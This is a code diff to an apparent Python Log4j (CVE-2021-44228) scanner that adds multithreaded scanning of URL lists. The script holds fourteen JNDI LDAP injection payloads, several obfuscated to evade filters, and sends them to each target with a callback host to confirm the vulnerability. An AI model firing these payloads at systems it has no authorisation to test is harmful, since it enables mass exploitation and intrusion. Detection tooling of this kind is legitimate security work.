@@ -20,6 +20,7 @@ from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.PublicKey import RSA
 from Crypto.Hash import SHA256
 from termcolor import cprint
+from concurrent.futures import ThreadPoolExecutor
 
 
 # Disable SSL warnings
@@ -77,6 +78,13 @@ parser.add_argument("--callback-url",
                     dest="custom_dns_callback_host",
                     help="Custom DNS Callback Host.",
                     action='store')
+parser.add_argument("--threads",
+                    dest="threads",
+                    help="Num threads for concurrent scanning - [Default: 30].",
+                    default=30,
+                    type=int,
+                    action='store')
+
 
 args = parser.parse_args()
 
@@ -131,8 +139,9 @@ def parse_url(url):
 
 
 def scan_url(url, callback_host):
+    cprint(f"[•] URL: {url}", "green")
     parsed_url = parse_url(url)
-    payload0 = "${jndi:ldap://"+callback_host+"]" 
+    payload0 = "${jndi:ldap://"+callback_host+"]"
     payload1 = "{${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://"+callback_host+"}"
     payload2 = "${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://"+callback_host+"}"
     payload3 = "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://"+callback_host+"}"
@@ -148,7 +157,7 @@ def scan_url(url, callback_host):
     payload13 = "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}://"+callback_host+"}"
     payloads = [payload0, payload1, payload2, payload3, payload4, payload5, payload6, payload7, payload8, payload9, payload10, payload11, payload12, payload13]
     for payload in payloads:
-        cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
+        cprint(f"[•] PAYLOAD: {payload}", "cyan")
         try:
             requests.request(url=url,
                                 method="GET",
@@ -158,7 +167,7 @@ def scan_url(url, callback_host):
                                 timeout=timeout,
                                 allow_redirects=True,
                                 proxies=proxies)
-                
+
         except Exception as e:
             cprint(f"EXCEPTION: {e}")
 
@@ -193,10 +202,10 @@ def scan_url(url, callback_host):
 
 def main():
     urls = []
-    
-    cprint(f"[•] Using custom DNS Callback host [{args.custom_dns_callback_host}].")
+
+    cprint(f"[•] Using [{args.custom_dns_callback_host}] for DNS callback.", "cyan")
     callback_host =  args.custom_dns_callback_host
-    
+
     if args.url:
         urls.append(args.url)
     if args.usedlist:
@@ -206,12 +215,12 @@ def main():
                 if i == "" or i.startswith("#"):
                     continue
                 urls.append(i)
-        
 
-    cprint("[%] Checking for Log4j RCE CVE-2021-44228.", "magenta")
-    for url in urls:
-        cprint(f"[•] URL: {url}", "magenta")
-        scan_url(url, callback_host)
+
+    cprint("[%] Checking for Log4j RCE CVE-2021-44228 and bypasses.", "magenta")
+    with ThreadPoolExecutor(args.threads) as exe:
+        for url in urls:
+            exe.submit(scan_url, url, callback_host)
 
     if args.custom_dns_callback_host:
         cprint("[•] Payloads sent to all URLs. Custom DNS Callback host is provided, please check your logs to verify the existence of the vulnerability. Exiting.", "cyan")
